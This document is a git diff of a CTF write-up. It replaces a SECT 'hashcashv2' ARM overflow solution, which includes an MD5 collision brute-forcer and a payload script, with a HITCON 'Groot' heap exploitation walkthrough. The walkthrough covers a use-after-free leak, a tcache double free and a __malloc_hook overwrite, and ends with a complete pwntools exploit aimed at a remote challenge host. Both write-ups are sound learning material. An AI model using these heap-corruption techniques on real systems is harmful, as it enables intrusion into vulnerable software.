@@ -32,12 +32,12 @@ As you can imagine, files don't have `head` because they are not directory and o
 
 ![Filesystem](images/filesystem.png)
 
-The available commands are `ls`, `cat`, `cd`, `rm`, `mv`, `mkdir`, `mkfile`, `touch`, `pwd`, `ln` and `id`. They work pretty much like the UNIX commands except some limitations given by the context. Functions used for these command are almost clean: `mv` has a bug that allows to rename a file with a already existing file name in the current directory just prefixing the new name of the file with `/`(e.g. `mv name /new_name` will rename the file name to new_name in the current directory even if new_name already exists), and a 3 byte overflow in `mkfile` which i think is not usable in my opinion.
+The available commands are `ls`, `cat`, `cd`, `rm`, `mv`, `mkdir`, `mkfile`, `touch`, `pwd`, `ln` and `id`. They work pretty much like the UNIX commands except some limitations given by the context. Functions used for these commands are almost clean: `mv` has a bug that allows to rename a file with a already existing file name in the current directory just prefixing the new name of the file with `/`(e.g. `mv name /new_name` will rename the file name to new_name in the current directory even if new_name already exists), and a 3 byte overflow in `mkfile` which i think is not usable in my opinion.
 Instead, the real vulnerabilities of this challenge is in the creation of a directory. Whenever a directory is created, the pointer to the `head` is not set to 0. This allows to create a new directory with a `head` pointer that could be controlled in some way.
 
 ## Heap leak
 
-If a directory is freed, all of the files, directories, names and contents are freed even before the parent directory gets freed. If then a new directory is created it will contains the same `head` address of the previus and freed directory. Thus, my idea was exactly this one: free a directory with a file inside, reallocate it immediately and then list the files to leak an address of a freed chunk. Moreover, one file wasn't not enought cause one freed chunks just contains a null pointer to the next free chunk. Two file weren't not enought too, cause every argument of a command is allocated as a chunk(so just typing the command will consume chunks in the freed linked list).
+If a directory is freed, all of the files, directories, names and contents are freed even before the parent directory gets freed. If then a new directory is created it will contain the same `head` address of the previous and freed directory. Thus, my idea was exactly this one: free a directory with a file inside, reallocate it immediately and then list the files to leak an address of a freed chunk. Moreover, one file was not enought cause one freed chunks just contains a null pointer to the next free chunk. Two file were not enought too, cause every argument of a command is allocated as a chunk(so just typing the command will consume chunks in the freed linked list).
 The part of the exploit that performs the leak is the following:
 
 ```python
@@ -47,7 +47,7 @@ createFile  (conn, 'file1', 'AAAA')
 createFile  (conn, 'file2', 'BBBB')
 createFile  (conn, 'file3', 'CCCC')
 cdDir       (conn, '..')
-rmFile      (conn, 'directory1')
+rm          (conn, 'directory1')
 makeDir     (conn, 'directory1')
 leak = ls   (conn, 'directory1')
 leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
@@ -61,194 +61,207 @@ cdDir       (conn, 'AAAA')
 cdDir       (conn, 'AAAA')
 cdDir       (conn, 'AAAA')
 cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
 cdDir       (conn, '..')
+makeDir     (conn, 'groot2')
+cdDir       (conn, 'groot2')
 ```
 
-commands after the `print` clear the workspace(i.e, fill some freed chunks) and then i preferred leave the directory for avoiding segfaults.
+Lasts `cd` commands just clear the workspace(i.e., fill some freed chunks) and then i preferred to leave the directory to avoid segfaults.
 
+## I am Groot
 
+Untill now, there's nothing special to know about this program, it is just an example of use after free. From now on instead, it is better to explain some more details about Groot! Almost every inserted string is passed to a strdup, which will allocate the correct number of bytes for that particular string(this mean that is not possible to pad input with zero or new line characters, for instance). Thus, if we want to insert an address in a chunk it will be surely inserted in a chunk of size 0x20(this is a key point for this challenge). Moreover, we cannot also create a fake `filesystem_object` because the first zero used for padding an address will terminate the string and place it in a chunk of size 0x20.
+Another key point is how the chunk are managed. We are provided with the libc(2.27) which manages the freed chunks with the tcache.
 
+## Write/Read on the heap
 
+Now comes the tricky part. If a directory is freed, recreated in the same chunk of the previous one and freed again, all of the files and subdirectories inside it will be freed two times. If it is done in a proper way, a double free may not lead to a memory corruption. In order to get a proper double free, I created some files(not all are used for the double free), one directory and one file inside this last. I need some files to be freed for the same reason I explained before: arguments consume the free list.
 
-
-
-
-
-As you can see in the image above, you are required to find a string, that starts with `nonce`, which it's MD5 hash that starts with `n` zero bytes, where `n` is the level number. At the very end (level 16) you are required to find an MD5 hash with all bytes to zero. If you find such hash, the program will do for you `system('/bin/sh')`.
-
-You are provided with:
-* `lib` directory: for libraries
-* `chall` bash file: for starting up the program
-* `hashcashv2` executable
-
-Info about hashcashv2:
-* Arch:     arm-32-little
-* RELRO:    Full RELRO
-* Stack:    Canary found
-* NX:       NX enabled
-* PIE:      No PIE (0x10000)
-
-I'm not an expert on crypto but for sure, there's no way to win the game legitly. Thus, i started looking for any vulnerability in the input and i find out that the input has an huge overflow in the `stdin`, `stdout` section. The memory structure of `.data` and `.bss` is the following.
-
-![Memory](images/memory.png)
-
-We can overwrite until `hmask`, so changing `count`, `nonce`, `stderr`, `stdin`, `stdout` and of course `hmash`. Changing `stdin` or `stdout` will lead to a segfault when performing input/ouptut operation (print, read, ...), so one of the first things i looked for was a memory leak of the libc. Unfortunately, i didn't find anything and i thought a way to change them without trigger any input/output operation.
-The remaining variables in the `.bss` are:
-* `count`: an signed integer variable used for addressing all of the hashes in a buffer on the stack. It is incremented every level and multiplied for 16(length of a MD5 digest) to select the address in which will be stored the current level hash.
-* `nonce`: it's the random byte which starts our string that will be hashed. It's a random value and it's not changing each level. It is placed in the input buffer on `.data` before reading the input.
-* `hmask`: mask used for show how many bytes are set to zero in the current level. Not very useful.
-Basically, we can change `count` and `nonce`. Incrementing the value of `count` will lead to an overwriting on part of the stack we are not interesed in. The game won't return normally, there's an alarm and so the only way to reach the return address on the stack is win the game legitly. Given that the `count` variable is signed, we can decrement it! In fact, if we overwrite the `count` variable with -1(`\xff\xff\xff\xff`), we can place the hash of the current input in the frame of a function called in the main function. The first function that will be called is the function that generates the hash and place it(using the `count` variable) in the buffer of the hash. With `count` equal to -1 this function overwrite its return address with the lowest 4 bytes of the current hash.
-
-## Idea! 
-
-Overwrite the return address of the hash function with a choosen address, so finding a collision on the first 4 byte of the hash.
-The only address we can use is 0x00010C70 which performs: <br />
-LDR     R0, =aBinSh     ; "/bin/sh" <br />
-BL      system <br />
-<br />
-N.B.: This address won't lead to any input/output operation, so it's perfect.
-
-## String structure
-
-Finally, we just need to create a string which its MD5 hash has its 4 byte equal to 0x00010C70.
-The string is composed by:
-* 1 random byte(`nonce`): we can not choose nor change it.
-* 1023 bytes: i placed them to `\x00`.
-* 20 bytes: bytes for `stderr`, `stdin`, `stdout` and 4 unused bytes.
-* `count` bytes: they have to be placed to `\xff\xff\xff\xff`
-* 4 bytes called `a`, `b`, `c` and `d`: i placed these bytes at the end in order to iterate them to find a collision.
-
-## Problem
-
-The only part of this string we cannot control is the `nonce` byte, so i decided to fill a list of `a`, `b`, `c` and `d` values that bring to a collision, for each value of `nonce`.
-
-## Script and collision generator
-
-I used the following program to generate the collision.
-
-```C
-#include <stdbool.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <openssl/md5.h>
-
-
-void printHash(char *digest)
-{
-    int i;
-
-    printf("MD5: ");
-    for(i = 0; i < 16; i++)
-    {
-        if (digest[i])
-        {
-            printf("%02x", digest[i] & 0xff);
-        }
-        else
-        {
-            printf("00");
-        }
-    }
-    printf("\n");
-}
-
-void main(int argc, char const *argv[])
-{
-    unsigned char digest[16];
-    MD5_CTX initial;
-    MD5_CTX final;
-    unsigned char data[1048];
-    unsigned char end[4];
-    int i, a, b, c , d;
-    bool found;
-
-
-    for(i = 1; i < 256; i++)
-    {
-        memset(data, 0, 1048);
-        data[0] = i;
-        data[1044] = 0xff;
-        data[1045] = 0xff;
-        data[1046] = 0xff;
-        data[1047] = 0xff;
-        MD5_Init(&initial);
-        MD5_Update(&initial, data, 1048);
-        found = false;
-        for(a = 0; a < 256 && found == false; a++)
-        {
-            for(b = 0; b < 256 && found == false; b++)
-            {
-                for(c = 0; c < 256 && found == false; c++)
-                {
-                    for(d = 0; d < 256 && found == false; d++)
-                    {
-                        memcpy(&final, &initial, sizeof(MD5_CTX));
-                        end[0] = (char) a;
-                        end[1] = (char) b;
-                        end[2] = (char) c;
-                        end[3] = (char) d;
-                        MD5_Update(&final, end, 4);
-                        MD5_Final(digest, &final);
-                        if((char) digest[0] == 0x70)
-                        {
-                            if((char) digest[1] == (char) 0x0C)
-                            {
-                                if((char) digest[2] == (char) 0x01)
-                                {
-                                    if((char) digest[3] == (char) 0x00)
-                                    {
-                                        printf("i: %02x\n", i & 0xff);
-                                        printf("a: %02x\n", a & 0xff);
-                                        printf("b: %02x\n", b & 0xff);
-                                        printf("c: %02x\n", c & 0xff);
-                                        printf("d: %02x\n", d & 0xff);
-                                        found = true;
-                                        printHash(digest);
-                                    }
-                                }
-                            }                           
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
+```python
+createFile  (conn, 'file1', 'file1')
+createFile  (conn, 'file2', 'file2')
+createFile  (conn, p64(heap_base + OFFSET_FILENAME4), 'file3')
+createFile  (conn, p64(heap_base + OFFSET_FILECONTENT5), 'file4') 
+createFile  (conn, 'file5', p64(heap_base + OFFSET_FILECONTENT5))
+makeDir     (conn, 'directory1')
+cdDir       (conn, 'directory1')
+createFile  (conn, 'file1', 'file1')
+cdDir       (conn, '..')
+rm          (conn, 'file1')
+rm          (conn, 'directory1')
+rm          (conn, 'file2')
+cdDir       (conn, 'A' * 0x30)
+makeDir     (conn, 'directory1')
+rm          (conn, 'directory1')
 ```
 
-It's very ignorant but, as i said, i'm not good on crypto stuff. However, it generates a collision at most every 3 min.
-Once generated a new collision, the `a`, `b`, `c` and `d` are placed in a list of the following script.
+With some `cd` of As I'm filling the chunks of file2, file3 and file4 with As. In this way, the directory will be created in the same chunk of the freed directory and again, it will have the same `head` address of the previous directory. Finally, freeing this last directory will provide us a double free and so, a list of free chunks in which we can control the pointer to the next free chunk.
+File3, file4 and file5 has values which may be not really clear now. The name of file3 is just a pointer to the pointer of the pointer of file4, file4 name is just a pointer to the pointer of the content of file5 and file5 content is a pointer to the pointer of its content.
 
-```Python
+IMMAGINE
+
+
+Now, with some `cd` it is possible to consume the free list. With what? With a pointer to the pointer of the name of file3. In this way we will move our free list in a list already prepared with file3, file4 and file5.
+
+```python
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME5))
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME5))
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME5))
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME5))
+```
+
+After this 4 commands our free lists will point to the pointer of the name of file3. Consuming another chunk will allow us to change the pointer of the name of file3 with an arbitrary pointer and moreover, the next free chunk will be the name of file3, which is a pointer ;)
+The new value of the pointer of the name of file3 will be a pointer close to the start of the heap. Indeed, in this region, there are pointers to the `.bss` because the root structure of the system is allocated on the `.bss` and several directories(bin, etc, lib...) have, as parent, the root directory. All this stuff will lead to a leak of the ELF.
+
+```python
+cdDir       (conn, p64(heap_base + ELF_POSITION))
+leak = ls   (conn, '')
+leak = leak.split('\x1b\x5b\x30\x6d\x09')[3]
+leak = leak.ljust(8, '\x00')
+elf_base = u64(leak) - ELF_OFFSET
+print 'ELF base: ' + hex(elf_base)
+```
+
+## Libc leak
+
+Same as before, just changing the pointer of the name of file4 to the pointer of the `__stack_chk_fail` in the `.got`. This will lead to a leak of the libc.
+
+```python
+cdDir       (conn, p64(elf_base + SCHK_OFFSET_GOT))
+cdDir       (conn, p64(elf_base + SCHK_OFFSET_GOT))
+leak = ls   (conn, '')
+leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
+leak = leak.ljust(8, '\x00')
+libc_base = u64(leak) - SCHK_OFFSET
+print 'libc base: ' + hex(libc_base)
+```
+
+## Magic
+
+Finally, we just need to chenge the value of the `__malloc_hook` to a value given by one_gadget.
+
+![Onegadget](images/onegadget.png)
+
+However, this time we need to change the pointer of the content of file5 into the pointer of the `__malloc_hook`, consume two chunks and write the value of the gagdet in the `__malloc_hook`. I used the third gadget.
+
+## Exploit
+
+```python
 from pwn import *
-import md5
 
-abcd_array = ['\x81\xf3\x1f\x02', '\x6a\xbc\xc3\x37']
-while True:
-    try:
-        #conn = process(argv=['qemu-arm', '-g', '4000', '-L', './', './hashcashv2_patched'])
-        conn = remote('142.93.39.178 2023', 2023)
-        conn.recvuntil('\x1B[1mnonce:\x1B[0m 0x')
-        byte = conn.recvuntil('\n')
-        byte = int(byte, 16)
-        conn.recvuntil('\x1B[1minput:\x1B[0m ')
-        data_payload = ('\x00' * 1023)
-        #libc std
-        bss_payload = '\x00' * 16
-        #completed
-        bss_payload += '\x00' * 4
-        #count
-        bss_payload += '\xff\xff\xff\xff'
-        #"proof of work"
-        bss_payload += abcd_array[byte]
-        payload = data_payload + bss_payload
-        conn.sendline(payload)
-        conn.interactive()
-    except Exception as e:
-        conn.close()
-        continue
+OFFSET_FILENAME3 = 0x12fc0
+OFFSET_FILENAME4 = 0x13040
+OFFSET_FILECONTENT5 = 0x130c8
+ELF_OFFSET = 0x204040
+ELF_POSITION = 0x11eb8
+SCHK_OFFSET_GOT = 0x203f70
+SCHK_OFFSET = 0x134c80
+MALLOC_HOOK_OFFSET = 0x3ebc30
+MAGIC = 0x10a38c
+env_vars = {'LD_LIBRARY_PATH':'.'}
+
+def createFile(conn, file_name, content):
+    conn.recvuntil('$')
+    conn.sendline('mkfile ' + file_name)
+    conn.recvuntil('Content?')
+    conn.send(content)
+
+def makeDir(conn, dir_name):
+    conn.recvuntil('$')
+    conn.sendline('mkdir ' + dir_name)
+
+def cdDir(conn, dir_path):
+    conn.recvuntil('$')
+    conn.sendline('cd ' + dir_path)
+
+def rm(conn, file_name):
+    conn.recvuntil('$')
+    conn.sendline('rm ' + file_name)
+
+def mvFile(conn, old, new):
+    conn.recvuntil('$')
+    conn.sendline('mv ' + old + ' ' + new)
+
+def ls(conn, path=''):
+    conn.recvuntil('$')
+    conn.sendline('ls ' + path)
+    return conn.recvuntil('\n\n')
+
+def touch(conn, file_name):
+    conn.recvuntil('$')
+    conn.sendline('touch ' + file_name)
+
+#conn = process('./groot_patched', env=env_vars, aslr=False)
+conn = remote('54.238.202.201', 31733)
+makeDir     (conn, 'directory1')
+cdDir       (conn, 'directory1')
+createFile  (conn, 'file1', 'AAAA')
+createFile  (conn, 'file2', 'BBBB')
+createFile  (conn, 'file3', 'CCCC')
+cdDir       (conn, '..')
+rm          (conn, 'directory1')
+makeDir     (conn, 'directory1')
+leak = ls   (conn, 'directory1')
+leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
+leak = leak.ljust(8, '\x00')
+heap_base = u64(leak) - 0x12d20
+print 'Heap base: ' + hex(heap_base)
+cdDir       (conn, 'A' * 0x30)
+cdDir       (conn, 'A' * 0x30)
+cdDir       (conn, 'A' * 0x30)
+cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
+cdDir       (conn, 'AAAA')
+cdDir       (conn, '..')
+makeDir     (conn, 'groot2')
+cdDir       (conn, 'groot2')
+
+
+### Workspace should be clear now
+createFile  (conn, 'file1', 'file1')
+createFile  (conn, 'file2', 'file2')
+createFile  (conn, p64(heap_base + OFFSET_FILENAME4), 'file3')
+createFile  (conn, p64(heap_base + OFFSET_FILECONTENT5), 'file4') 
+createFile  (conn, 'file5', p64(heap_base + OFFSET_FILECONTENT5))
+makeDir     (conn, 'directory1')
+cdDir       (conn, 'directory1')
+createFile  (conn, 'file1', 'file1')
+cdDir       (conn, '..')
+rm          (conn, 'file1')
+rm          (conn, 'directory1')
+rm          (conn, 'file2')
+cdDir       (conn, 'A' * 0x30)
+makeDir     (conn, 'directory1')
+rm          (conn, 'directory1')
+
+# Double free performed
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
+cdDir       (conn, p64(heap_base + OFFSET_FILENAME3))
+cdDir       (conn, p64(heap_base + ELF_POSITION))
+leak = ls   (conn, '')
+leak = leak.split('\x1b\x5b\x30\x6d\x09')[3]
+leak = leak.ljust(8, '\x00')
+elf_base = u64(leak) - ELF_OFFSET
+print 'ELF base: ' + hex(elf_base)
+cdDir       (conn, p64(elf_base + SCHK_OFFSET_GOT))
+cdDir       (conn, p64(elf_base + SCHK_OFFSET_GOT))
+leak = ls   (conn, '')
+leak = leak.split('\x1b\x5b\x30\x6d\x09')[2]
+leak = leak.ljust(8, '\x00')
+libc_base = u64(leak) - SCHK_OFFSET
+print 'libc base: ' + hex(libc_base)
+cdDir       (conn, p64(libc_base + MALLOC_HOOK_OFFSET))
+cdDir       (conn, p64(libc_base + MALLOC_HOOK_OFFSET))
+cdDir       (conn, p64(libc_base + MAGIC))
+cdDir       (conn, p64(libc_base + MAGIC))
+cdDir       (conn, p64(libc_base + MAGIC))
+createFile  (conn, "I_AM_GROOT!!!", "I_AM_GROOT!!!")
+conn.interactive()
 ```
-As you can see, there are only two values in the list because i got lucky and the `nonce` byte was 0x00 or 0x01.
-<br />
-`SECT{Y0U_kn0w_i7s_b@d_wHeN_cAn4R1es_n33d_C@NaRi3z}`
+
+`hitcon{Groot_knows_heap_exploitation:evergreen_tree:}`
